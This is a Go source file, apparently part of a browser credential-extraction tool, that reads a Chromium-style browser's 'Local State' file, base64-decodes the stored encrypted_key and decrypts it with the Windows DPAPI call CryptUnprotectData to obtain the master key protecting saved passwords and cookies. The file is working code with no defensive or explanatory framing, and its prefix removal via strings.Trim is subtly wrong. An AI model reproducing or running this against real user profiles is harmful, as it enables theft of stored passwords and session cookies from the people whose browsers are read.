package decrypt

import (
	"encoding/base64"
	"encoding/json"
	"log"
	"os"
	"path"
	"strings"
	"syscall"
	"unsafe"

	_ "modernc.org/sqlite"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func GetBrowserEncryptedKey(browserPath string) []byte {

	file, err := os.ReadFile(path.Join(browserPath, "Local State"))
	if err != nil {
		log.Println(err)
	}

	var result map[string]interface{}
	json.Unmarshal(file, &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it

	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
	if err != nil {
		log.Println(err)
	}
	stringKey := string(decodedKey)

	stringKey = strings.Trim(stringKey, "DPAPI")

	masterKey, err := Decrypt([]byte(stringKey))
	if err != nil {
		log.Println(err)
	}

	return masterKey
}
